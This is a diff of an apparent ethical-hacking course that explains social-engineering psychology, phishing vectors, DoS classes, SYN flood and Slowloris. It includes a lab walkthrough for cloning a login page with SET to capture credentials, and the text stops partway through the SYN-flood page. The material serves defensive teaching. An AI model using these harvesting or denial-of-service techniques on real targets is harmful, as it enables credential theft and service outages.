+          <rect x="360" y="12" width="220" height="38" rx="9" fill="#1f2533" stroke="#e63946"/><text class="d-title" x="470" y="37" text-anchor="middle" font-size="14">THE HUMAN</text>
+          <g class="node" data-node="auth" tabindex="0"><rect x="20" y="80" width="175" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="107" y="102" text-anchor="middle" font-size="12.5">Authority</text><text class="d-sub" x="107" y="120" text-anchor="middle">&quot;this is the CEO&quot;</text></g>
+          <g class="node" data-node="urg" tabindex="0"><rect x="210" y="80" width="175" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="297" y="102" text-anchor="middle" font-size="12.5">Urgency</text><text class="d-sub" x="297" y="120" text-anchor="middle">&quot;act in 10 min&quot;</text></g>
+          <g class="node" data-node="trust" tabindex="0"><rect x="400" y="80" width="175" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="487" y="102" text-anchor="middle" font-size="12.5">Trust</text><text class="d-sub" x="487" y="120" text-anchor="middle">a familiar brand</text></g>
+          <g class="node" data-node="fear" tabindex="0"><rect x="590" y="80" width="175" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="677" y="102" text-anchor="middle" font-size="12.5">Fear</text><text class="d-sub" x="677" y="120" text-anchor="middle">&quot;account locked&quot;</text></g>
+          <g class="node" data-node="recip" tabindex="0"><rect x="770" y="80" width="150" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="845" y="102" text-anchor="middle" font-size="12.5">Reciprocity</text><text class="d-sub" x="845" y="120" text-anchor="middle">a free favour</text></g>
+          <path d="M430,50 L120,78" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+          <path d="M450,50 L300,78" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+          <path d="M470,50 L487,78" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+          <path d="M490,50 L675,78" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+          <path d="M510,50 L840,78" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+        </svg>
+        <div class="dgm-hint">Click each lever &mdash; how the attacker pulls it, and the training that counters it.</div>
+        <div class="dgm-detail" data-detail="auth"><h5><span class="dd-tag">AUTHORITY</span>We defer to the boss</h5><p><b>Impersonate someone senior or official &mdash; the CEO, IT, a regulator &mdash; and requests get obeyed with less scrutiny.</b> &quot;CEO fraud&quot; / BEC (business email compromise) is exactly this. Counter: verify unusual requests through a <em>separate</em> channel, regardless of who they claim to be.</p></div>
+        <div class="dgm-detail" data-detail="urg"><h5><span class="dd-tag">URGENCY</span>No time to think</h5><p><b>A deadline removes the pause where scrutiny lives: &quot;wire it in the next 10 minutes or we lose the deal.&quot;</b> Pressure is the attacker&#39;s friend. Counter: policy that <em>slows down</em> sensitive actions &mdash; urgency itself is a red flag, not a reason to skip checks.</p></div>
+        <div class="dgm-detail" data-detail="trust"><h5><span class="dd-tag">TRUST / FAMILIARITY</span>It looks right</h5><p><b>A familiar logo, a spoofed sender name, a look-alike domain &mdash; the brain pattern-matches &quot;safe&quot; and stops looking.</b> The entire craft of a phishing page is manufacturing this familiarity. Counter: check the actual sender address and URL, not the display name or the logo.</p></div>
+        <div class="dgm-detail" data-detail="fear"><h5><span class="dd-tag">FEAR</span>Panic overrides caution</h5><p><b>&quot;Your account has been compromised&quot; / &quot;you owe a fine&quot; triggers a stress response that short-circuits judgement.</b> Fear and urgency often combine. Counter: awareness that legitimate orgs do not resolve emergencies via a surprise link &mdash; and a calm reporting path.</p></div>
+        <div class="dgm-detail" data-detail="recip"><h5><span class="dd-tag">RECIPROCITY</span>We repay favours</h5><p><b>A small gift or help creates a sense of obligation the attacker cashes in (baiting, quid pro quo &mdash; &quot;free IT help&quot; in exchange for a password).</b> Counter: policy that no credential or access is ever exchanged for a favour, however friendly.</p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; read a phishing email as a psychologist, not just a techie</span><pre><code># For any suspicious message, name the lever(s) being pulled:
+#   'URGENT: CEO needs gift cards now'      -> authority + urgency
+#   'Your account is locked, verify here'   -> fear + trust (fake brand)
+#   'Free security scan, just log in'        -> reciprocity + trust
+# naming the lever is how you inoculate a user against it</code></pre><p style="margin-top:8px"><b>You should see:</b> the technical tells (bad domain, odd link) matter, but the <em>lever</em> is why a smart person clicks. Training that names the psychology &mdash; not just &quot;check the URL&quot; &mdash; is what actually reduces click rates.</p></div><div class="box key-takeaway"><span class="box-t">Attack the person, defend the person</span><p><strong class="hl hl-d">Social engineering exploits normal, useful instincts.</strong> Authority, urgency, trust, fear, reciprocity &mdash; name the lever and you can both craft the attack and train the human to resist it. Awareness is the patch.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Social engineering types">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P16</span><span class="tag theory">Method &middot; the vectors</span><span class="time">&#9201; 6 min</span></div>
+      <h1>The Vectors &mdash; Phishing and Its Family</h1>
+      <p class="lede">One psychology, many delivery channels. Learn the vector names so you can scope an assessment and train against each.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Same lever, different channel</span><p>The psychology is constant; the <strong>delivery vector</strong> varies. Knowing the names matters because an awareness programme and a red-team scope are both organised by vector. Click each &mdash; the channel and the tell.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 200" role="img" aria-label="Social engineering vectors: phishing, spear phishing, vishing, smishing, pretexting, baiting, tailgating, watering hole. Click each.">
+          <g class="node" data-node="phish" tabindex="0"><rect x="20" y="30" width="215" height="46" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="127" y="52" text-anchor="middle" font-size="12.5">Phishing (email)</text><text class="d-sub" x="127" y="68" text-anchor="middle">mass, generic</text></g>
+          <g class="node" data-node="spear" tabindex="0"><rect x="250" y="30" width="215" height="46" rx="8" fill="#241417" stroke="#e63946"/><text class="d-lbl" x="357" y="52" text-anchor="middle" font-size="12.5">Spear / whaling</text><text class="d-sub" x="357" y="68" text-anchor="middle">targeted, researched</text></g>
+          <g class="node" data-node="vish" tabindex="0"><rect x="480" y="30" width="215" height="46" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="587" y="52" text-anchor="middle" font-size="12.5">Vishing (voice)</text><text class="d-sub" x="587" y="68" text-anchor="middle">phone call</text></g>
+          <g class="node" data-node="smish" tabindex="0"><rect x="710" y="30" width="210" height="46" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="815" y="52" text-anchor="middle" font-size="12.5">Smishing (SMS)</text><text class="d-sub" x="815" y="68" text-anchor="middle">text message</text></g>
+          <g class="node" data-node="pretext" tabindex="0"><rect x="20" y="92" width="215" height="46" rx="8" fill="#1f2533" stroke="#fbbf24"/><text class="d-lbl" x="127" y="114" text-anchor="middle" font-size="12.5">Pretexting</text><text class="d-sub" x="127" y="130" text-anchor="middle">an invented scenario</text></g>
+          <g class="node" data-node="bait" tabindex="0"><rect x="250" y="92" width="215" height="46" rx="8" fill="#1f2533" stroke="#fbbf24"/><text class="d-lbl" x="357" y="114" text-anchor="middle" font-size="12.5">Baiting</text><text class="d-sub" x="357" y="130" text-anchor="middle">dropped USB / lure</text></g>
+          <g class="node" data-node="tail" tabindex="0"><rect x="480" y="92" width="215" height="46" rx="8" fill="#1f2533" stroke="#fbbf24"/><text class="d-lbl" x="587" y="114" text-anchor="middle" font-size="12.5">Tailgating</text><text class="d-sub" x="587" y="130" text-anchor="middle">physical follow-in</text></g>
+          <g class="node" data-node="water" tabindex="0"><rect x="710" y="92" width="210" height="46" rx="8" fill="#1f2533" stroke="#fbbf24"/><text class="d-lbl" x="815" y="114" text-anchor="middle" font-size="12.5">Watering hole</text><text class="d-sub" x="815" y="130" text-anchor="middle">compromise a site they visit</text></g>
+        </svg>
+        <div class="dgm-hint">Click each vector &mdash; the channel and how to scope/defend it.</div>
+        <div class="dgm-detail" data-detail="phish"><h5><span class="dd-tag">PHISHING</span>Mass email lure</h5><p><b>Generic email to many recipients with a malicious link or attachment.</b> Low effort, low per-target success, high volume. The bread-and-butter vector &mdash; and the one your SET lab simulates.</p></div>
+        <div class="dgm-detail" data-detail="spear"><h5><span class="dd-tag">SPEAR / WHALING</span>Targeted &amp; researched</h5><p><b>Spear phishing is tailored to one person using OSINT (their name, role, projects); whaling targets executives.</b> Far higher success because it is credible. This is where Session 2&#39;s footprinting feeds the attack.</p></div>
+        <div class="dgm-detail" data-detail="vish"><h5><span class="dd-tag">VISHING</span>Voice</h5><p><b>A phone call impersonating IT, a bank, or an authority to extract info or push an action.</b> Real-time pressure makes it potent. Counter: call-back verification on a known number.</p></div>
+        <div class="dgm-detail" data-detail="smish"><h5><span class="dd-tag">SMISHING</span>SMS</h5><p><b>A text with a malicious link (&quot;your parcel is held, pay here&quot;).</b> Short, urgent, hard to inspect a link on mobile. Rising fast with mobile use.</p></div>
+        <div class="dgm-detail" data-detail="pretext"><h5><span class="dd-tag">PRETEXTING</span>The invented story</h5><p><b>A fabricated but believable scenario &mdash; &quot;I&#39;m from the vendor doing an audit&quot; &mdash; that justifies the request.</b> The backbone of vishing and in-person attacks; the quality of the pretext is the quality of the attack.</p></div>
+        <div class="dgm-detail" data-detail="bait"><h5><span class="dd-tag">BAITING</span>The lure</h5><p><b>A tempting object &mdash; a dropped USB labelled &quot;Salaries,&quot; a free download &mdash; that delivers malware when used.</b> Exploits curiosity and reciprocity. Counter: disable autorun, never plug in found media.</p></div>
+        <div class="dgm-detail" data-detail="tail"><h5><span class="dd-tag">TAILGATING</span>Physical entry</h5><p><b>Following an authorised person through a secure door (&quot;hands full, can you hold it?&quot;).</b> Bypasses badge access via politeness. Counter: no-tailgating policy, mantraps, awareness.</p></div>
+        <div class="dgm-detail" data-detail="water"><h5><span class="dd-tag">WATERING HOLE</span>Poison their haunt</h5><p><b>Compromise a legitimate site the target group frequents, so the victims come to the malware.</b> Indirect and stealthy &mdash; used against specific communities/industries. Counter: patching, network monitoring, browser isolation.</p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; scope a phishing assessment by vector</span><pre><code># A red-team SE scope names vectors + rules of engagement, e.g.:
+#   email phishing (cred-harvest page) — YES, all staff
+#   vishing the help-desk               — YES, 3 attempts
+#   physical tailgating                 — NO (out of scope)
+#   whaling the CFO                      — YES, with exec consent
+# every vector needs explicit, written authorisation</code></pre><p style="margin-top:8px"><b>You should see:</b> an assessment is organised and authorised <em>by vector</em> &mdash; each channel has different rules, consent, and risk. Naming the vectors is how you scope the engagement and build the training programme.</p></div><div class="box key-takeaway"><span class="box-t">One psychology, many doors</span><p><strong class="hl">The lever is constant; the channel varies.</strong> Email, voice, SMS, physical, web &mdash; scope and defend each vector explicitly. Spear/whaling (researched) beats mass phishing because credibility is everything.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Phishing with SET">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P17</span><span class="tag tool">Attack &middot; harvest credentials</span><span class="time">&#9201; 7 min</span></div>
+      <h1>The Phishing Flow &mdash; SET and the Credential Harvester</h1>
+      <p class="lede">Watch a phishing attack end to end: a pretext, a cloned login page, and a captured password &mdash; built with the Social-Engineer Toolkit.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Automating the con</span><p>The <strong>Social-Engineer Toolkit (SET)</strong> automates the technical half of phishing: it clones a real login page, hosts it, and captures whatever credentials a victim types. The <em>human</em> half &mdash; the pretext that gets them there &mdash; is yours to craft using the psychology from two pages ago. Watch the flow, then build one on your lab.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 370" role="img" aria-label="Credential-harvesting phishing: the attacker clones a login page with SET, lures the victim via a pretext email, and captures the credentials the victim submits.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--red)">ATTACKER + SET</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">clones the page</text>
+          <line x1="185" y1="80" x2="185" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">VICTIM</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">gets the lure</text>
+          <line x1="520" y1="80" x2="520" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">CLONE PAGE</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">captures creds</text>
+          <line x1="890" y1="80" x2="890" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <rect x="245" y="98" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--red)"/>
+          <text x="470" y="118" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--red)">SET clones the real login page &amp; hosts it</text>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="352" y="160" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">pretext email: &quot;verify your account now&quot;</text>
+          <path d="M191,174 L514,174" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <text x="705" y="214" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--orange)">victim clicks &amp; enters their password</text>
+          <path d="M526,228 L884,228" fill="none" stroke="var(--orange)" stroke-width="2.4" marker-end="url(#ar-o)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:26px">
+          <text x="537" y="268" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">credentials captured &rarr; attacker</text>
+          <path d="M884,282 L191,282" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px">
+          <rect x="245" y="314" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--green)"/>
+          <text x="470" y="334" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--green)">SOC flip: look-alike domain, new login source, user report</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>A pixel-perfect copy of the target&#39;s login, served from the attacker&#39;s server. The &quot;trust/familiarity&quot; lever, manufactured.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>Authority + urgency + a look-alike link. The human half of the attack &mdash; only as good as the pretext.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>The page looks right, so the victim types real credentials into the clone.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>SET logs the username and password; the victim is often redirected to the real site so nothing seems wrong.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>A freshly-registered look-alike domain, a login from a new geo right after, and &mdash; the best sensor &mdash; a user who reports the email.</div>
+        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; read the tells of a cloned login page</span><pre><code># Teach users to check, in order:
+#   1. the DOMAIN in the address bar   (paypa1.com != paypal.com)
+#   2. the padlock + certificate name  (does it match?)
+#   3. did I initiate this?            (unsolicited 'verify' = suspicious)
+# and confirm a domain's age (young = suspicious) via whois:
+whois suspicious-domain.com | grep -i 'creation'</code></pre><p style="margin-top:8px"><b>You should see:</b> the cloned <em>page</em> can be perfect, but the <strong>domain</strong> cannot be &mdash; it is never the real one. Teaching users to read the address bar (and a young registration date) is the single highest-value phishing defence.</p></div><div class="box key-takeaway"><span class="box-t">Tech clones the page; you craft the pretext</span><p><strong class="hl">A phishing attack is a perfect page plus a believable story.</strong> SET makes the page trivial; the pretext (authority, urgency, trust) decides success. Defence: the domain always betrays it, and a reporting culture beats any filter.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab C: phishing lab">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P18</span><span class="tag lab">Hands-on &middot; everyone &middot; ethics-gated</span><span class="time">&#9201; 16 min</span></div>
+      <h1>Lab C &mdash; Build a Credential Harvester (Lab Only)</h1>
+      <p class="lede">Clone a login page with SET, capture a test credential, and see the whole attack &mdash; then the indicators that catch it.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Run the attack you must defend against</span><p>You will use SET&#39;s credential-harvester to clone a login page on your lab network and capture a credential <em>you</em> type as the test victim. The point is to <strong>understand the attack well enough to train against it</strong> &mdash; and to see how easy the technical half is, so you respect how much rides on human awareness.</p></div><div class="box warn"><span class="box-t">Ethics gate &mdash; read before you run</span><p><strong>Only on your isolated lab, only against accounts you own or consenting lab test accounts, never a real person or brand.</strong> Phishing a real target without explicit written authorisation is illegal. This lab exists to build the defender&#39;s understanding, full stop.</p></div>
+      <ol class="steps">
+<li>
+<b>Launch SET</b> and choose the credential-harvester:
+<pre><code>sudo setoolkit
+# 1) Social-Engineering Attacks -> 2) Website Attack Vectors
+# -> 3) Credential Harvester Method -> 2) Site Cloner</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>SET&#39;s menu walks you to the harvester. The Site Cloner copies a real page so the clone looks authentic.</li></ul></div>
+</li>
+<li>
+<b>Clone a page</b> onto your lab attacker IP (use a lab login page, not a real brand):
+<pre><code># set POST-back IP to your Kali (e.g. 192.168.56.101)
+# clone URL: http://LAB-APP/login   (your own lab app's login)
+# SET now serves the cloned page and listens for submitted creds</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>The cloned login is live on your attacker box. In a real engagement this would be a look-alike domain; in the lab it is your Kali IP.</li></ul></div>
+</li>
+<li>
+<b>Play the victim</b> &mdash; browse to the clone and submit a test credential:
+<pre><code># from the 'victim' VM, open http://192.168.56.101/ and 'log in'
+# SET's console prints the captured username + password in real time</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>The credential you typed appears in SET&#39;s console instantly. That is the entire technical payoff &mdash; and it took two minutes, which is the lesson.</li></ul></div>
+</li>
+<li>
+<b>Flip to defender</b> &mdash; list the indicators and controls:
+<pre><code># indicators: look-alike/young domain; the login page served from an odd IP;
+#             a victim login from a new location right after the email.
+# controls:   user reporting button, MFA (a phished password alone fails),
+#             email filtering/DMARC, and awareness training on the levers.</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>MFA is the key technical mitigation here &mdash; a harvested password alone will not log in. Combined with reporting and filtering, it defangs most phishing. That is your report&#39;s recommendation.</li></ul></div>
+</li>
+</ol>
+      <div class="box key-takeaway"><span class="box-t">Easy to build, defeated by MFA + awareness</span><p><strong class="hl hl-d">The technical half of phishing is trivial; the defence is human + MFA.</strong> A harvested password fails against MFA, a trained user reports the email, and a filter blocks the domain. Layer them.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="DoS &amp; DDoS">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P19</span><span class="tag theory">Attack &middot; deny availability</span><span class="time">&#9201; 6 min</span></div>
+      <h1>Denial of Service &mdash; Attacking Availability</h1>
+      <p class="lede">The third pillar of security is availability, and it is the one no patch guarantees. Learn the three ways to take a service down.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">When you cannot get in, keep everyone out</span><p>Confidentiality and integrity get the attention, but <strong>availability</strong> is a security property too &mdash; and the easiest to attack. A <strong>DoS</strong> overwhelms a target from one source; a <strong>DDoS</strong> uses a <em>botnet</em> of many, which is both far more powerful and much harder to block. The three techniques differ in <em>what</em> they exhaust. Click each.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 190" role="img" aria-label="Three classes of denial of service: volumetric, protocol, and application-layer. Click each.">
+          <g class="node" data-node="vol" tabindex="0"><rect x="30" y="45" width="270" height="110" rx="12" fill="#241417" stroke="#ff7043"/><text class="d-title" x="165" y="80" text-anchor="middle" font-size="14" fill="#ff7043">VOLUMETRIC</text><text class="d-sub" x="165" y="104" text-anchor="middle">exhaust BANDWIDTH</text><text class="d-sub" x="165" y="124" text-anchor="middle">UDP/ICMP flood, amplification</text><text class="d-sub" x="165" y="144" text-anchor="middle">measured in Gbps</text></g>
+          <g class="node" data-node="proto" tabindex="0"><rect x="335" y="45" width="270" height="110" rx="12" fill="#1f2533" stroke="#fbbf24"/><text class="d-title" x="470" y="80" text-anchor="middle" font-size="14" fill="#fbbf24">PROTOCOL</text><text class="d-sub" x="470" y="104" text-anchor="middle">exhaust CONNECTION STATE</text><text class="d-sub" x="470" y="124" text-anchor="middle">SYN flood, Ping of Death</text><text class="d-sub" x="470" y="144" text-anchor="middle">fills the server's tables</text></g>
+          <g class="node" data-node="app" tabindex="0"><rect x="640" y="45" width="270" height="110" rx="12" fill="#1a1f2a" stroke="#22d3ee"/><text class="d-title" x="775" y="80" text-anchor="middle" font-size="14" fill="#22d3ee">APPLICATION-LAYER</text><text class="d-sub" x="775" y="104" text-anchor="middle">exhaust APP RESOURCES</text><text class="d-sub" x="775" y="124" text-anchor="middle">HTTP flood, Slowloris</text><text class="d-sub" x="775" y="144" text-anchor="middle">low bandwidth, high impact</text></g>
+        </svg>
+        <div class="dgm-hint">Click each class &mdash; what it exhausts and how it is stopped.</div>
+        <div class="dgm-detail" data-detail="vol"><h5><span class="dd-tag">VOLUMETRIC</span>Drown the pipe</h5><p><b>Flood the target with more traffic than its link can carry &mdash; UDP/ICMP floods, and <em>amplification</em> (DNS/NTP reflection) where a small spoofed request elicits a huge response aimed at the victim.</b> Measured in Gbps/Tbps. Only stopped upstream: a CDN/scrubbing service or the ISP &mdash; you cannot absorb it at the host.</p></div>
+        <div class="dgm-detail" data-detail="proto"><h5><span class="dd-tag">PROTOCOL</span>Exhaust the state tables</h5><p><b>Abuse how a protocol tracks connections &mdash; a <b>SYN flood</b> opens half-connections that never complete, filling the server&#39;s connection table so real clients are refused.</b> Low bandwidth, high effect. Stopped with SYN cookies, rate limiting, and stateful firewalls.</p></div>
+        <div class="dgm-detail" data-detail="app"><h5><span class="dd-tag">APPLICATION-LAYER</span>Cheap and quiet</h5><p><b>Target an expensive app function with legitimate-looking requests &mdash; an HTTP flood, or <b>Slowloris</b> which holds many connections open by sending headers one byte at a time, tying up all worker threads.</b> Very low bandwidth, hard to distinguish from real users. Stopped with reverse proxies, connection/timeouts limits, and WAFs.</p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; classify a DoS from its symptom</span><pre><code># Match the symptom to the class:
+#   'inbound traffic is 40 Gbps, link saturated'   -> volumetric (need upstream scrubbing)
+#   'CPU fine, but the connection table is full'    -> protocol / SYN flood (SYN cookies)
+#   'few requests/sec, yet all workers are busy'    -> app-layer / Slowloris (proxy + timeouts)</code></pre><p style="margin-top:8px"><b>You should see:</b> the defence depends entirely on <em>what</em> is exhausted &mdash; bandwidth, connection state, or app workers. Volumetric must be stopped upstream; protocol and app-layer can be mitigated at the edge. Naming the class picks the fix.</p></div><div class="box key-takeaway"><span class="box-t">Availability is attackable &mdash; match the defence to the class</span><p><strong class="hl">DoS exhausts a resource: bandwidth, state, or app workers.</strong> Volumetric &rarr; upstream scrubbing/CDN; protocol &rarr; SYN cookies/rate-limit; app-layer &rarr; proxy/timeouts. DDoS (a botnet) makes all three worse and harder to filter by source.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="SYN flood &amp; Slowloris">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P20</span><span class="tag attack">Attack &middot; two ways down</span><span class="time">&#9201; 6 min</span></div>
+      <h1>SYN Flood and Slowloris &mdash; Two Ways to Exhaust a Server</h1>
+      <p class="lede">Two classic low-bandwidth DoS attacks that beat a big server with a small pipe. Watch each exhaust a different resource.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Small attacker, big target</span><p>You do not need a botnet to understand DoS. A <strong>SYN flood</strong> (protocol) fills the connection table with half-open connections; <strong>Slowloris</strong> (app-layer) ties up every worker thread by dribbling out requests forever. Both beat a well-resourced server with very little bandwidth &mdash; watch how.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 424" role="img" aria-label="SYN flood versus Slowloris: one fills the TCP connection table with half-open connections, the other holds application worker threads open with never-completing requests.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--red)">ATTACKER</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">small pipe</text>
+          <line x1="185" y1="80" x2="185" y2="402" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">SERVER STATE</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">the exhausted resource</text>
+          <line x1="520" y1="80" x2="520" y2="402" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">REAL USERS</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">get refused</text>
+          <line x1="890" y1="80" x2="890" y2="402" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <rect x="245" y="98" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--red)"/>
+          <text x="470" y="118" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--red)">SYN FLOOD: send SYN, never send the final ACK</text>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="352" y="160" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">thousands of half-open connections pile up</text>
+          <path d="M191,174 L514,174" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <rect x="245" y="206" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--red)"/>
+          <text x="470" y="226" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--red)">SLOWLORIS: open many HTTP requests, send headers 1 byte at a time</text>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:-26px">
+          <text x="352" y="268" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">all worker threads held busy</text>
+          <path d="M191,282 L514,282" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:26px">
+          <text x="705" y="322" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">server refuses new (real) connections</text>
+          <path d="M526,336 L884,336" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="6" style="--pf-dx:-26px">
+          <rect x="245" y="368" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--green)"/>
+          <text x="470" y="388" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--green)">DEFENCE: SYN cookies / rate-limit / reverse proxy + timeouts</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>Each half-open connection reserves a slot in the server&#39;s connection table while it waits for an ACK that never comes.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>The connection table fills. Bandwidth used is tiny &mdash; the resource exhausted is connection <em>state</em>.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>Each request stays &quot;in progress&quot; forever, so the worker handling it is never freed.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>A few hundred slow connections tie up every worker &mdash; again, almost no bandwidth used.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>With state or workers exhausted, legitimate users get timeouts or refusals &mdash; the denial of service.</div>
+        <div class="pf-cap" data-cap="6"><span class="pf-n">STEP 6</span>SYN cookies remove the half-open state; a reverse proxy with strict header timeouts kills Slowloris.</div>
+        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; see half-open connections (the SYN-flood fingerprint)</span><pre><code># on a server under (lab) SYN flood, count half-open connections:
+ss -tan state syn-recv | wc -l      # a large number = SYN flood in progress
+netstat -an | grep -c SYN_RECV        # same idea
